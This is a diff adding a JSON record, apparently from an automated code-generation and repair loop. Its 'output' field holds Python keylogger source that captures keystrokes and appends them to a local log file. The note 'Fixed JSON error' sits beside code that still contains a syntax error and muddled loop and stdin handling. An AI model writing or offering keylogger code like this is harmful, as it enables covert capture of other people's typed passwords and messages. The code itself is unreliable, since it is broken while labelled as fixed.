@@ -1,0 +1,8 @@
+{
+  "output": "import keyboard, sys\n\nlogfile = \"keylogs.txt\"\n\ntry:\n    with open(logfile, \"a\") as f:\n        while True:\n            for event in keyboard.record_events():\n                if event.event_type == keyboard.KEY_DOWN:\n                    if event.name not in keyboard.all_modifiers:\n                        key = event.name.replace(\"right\", \"\").replace(\"left\", \"\")\n                        if len(key) > 1 and (key.isalpha() or key.isdigit()):\n                            f.write(key)\n                        else:\n                            f.write(\"[\"]\" + key.upper().replace(\"CTRL\", \"CTRL-\").replace(\"SHIFT\", \"SHIFT-\") + \"]\\n\")\n                    print(\"Key pressed: \", key)\n                elif event.event_type == keyboard.KEY_UP:\n                    break\nfinally:\n    if not sys.stdin._closed:\n        sys.stdin = open(sys.stdin.fileno(), \"rb\", buffering=0)\nkeyboard.unhook_all()",
+  "notes": "Fixed JSON error.",
+  "applied_fixes": [
+    "iteration4_issue1"
+  ],
+  "iterations": 5
+}
